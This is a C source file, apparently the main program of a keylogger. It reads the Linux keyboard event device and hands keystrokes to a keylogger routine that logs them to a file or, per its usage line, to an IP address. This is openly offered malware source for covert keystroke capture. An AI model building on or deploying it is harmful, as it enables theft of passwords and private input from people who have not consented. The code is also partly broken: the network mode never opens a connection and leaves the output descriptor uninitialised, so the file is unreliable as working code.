//
// Created by mallo on 13/12/2022.
//

#include <stdio.h>
#include <stdlib.h>
#include <getopt.h>
#include <errno.h>
#include "keylogger.h"

const char *get_platform_name();
void print_usage_and_quit(char *application_name);
const char *parse_options(int argc, char *argv[]);

// flag checker for command line option
int network = 0, file = 0;

int main(int argc, char *argv[]) {
    // prints platform
    puts(get_platform_name());

    // output file descriptor
    int writeout;

    // keyboard file descriptor
    // only for linux usage
    int keyboard = 0;

    // option value
    // file path or ip address
    const char *option_input = parse_options(argc, argv);

    // both or neither options are given, not permitted
    if(network == file) {
        print_usage_and_quit(argv[0]);
    }
    else if(file) {
        if((writeout = open(option_input, O_WRONLY | O_APPEND | O_CREAT, S_IROTH)) < 0){
            printf("Error opening file %s: %s\n", argv[2], strerror(errno));
            return 1;
        }
    }

    #if defined(PLATFORM_LINUX)

    char *KEYBOARD_DEVICE = get_keyboard_event_file();
    if(!KEYBOARD_DEVICE){
        print_usage_and_quit(argv[0]);
    }

    if((keyboard = open(KEYBOARD_DEVICE, O_RDONLY)) < 0){
        printf("Error accessing keyboard from %s. May require you to be superuser\n", KEYBOARD_DEVICE);
        return 1;
    }
    #endif

    keylogger(keyboard, writeout);
    close(writeout);

}

const char *get_platform_name() {
    return (PLATFORM_NAME == NULL) ? "" : PLATFORM_NAME;
}

const char *parse_options(int argc, char *argv[]) {
    int option = 0;

    // parse command line options until option == -1 (no more options)
    // then returns the value of the option
    while((option = getopt(argc, argv,"sn:f:")) != -1){
        switch(option){
            case 'n':
                network = 1;
                break;
            case 'f':
                file = 1;
                break;
            default: print_usage_and_quit(argv[0]);
        }
        return optarg;
    }
}

void print_usage_and_quit(char *application_name){
    printf("Usage: %s [-n ip-address | -f output-file]\n", application_name);
    exit(1);
}

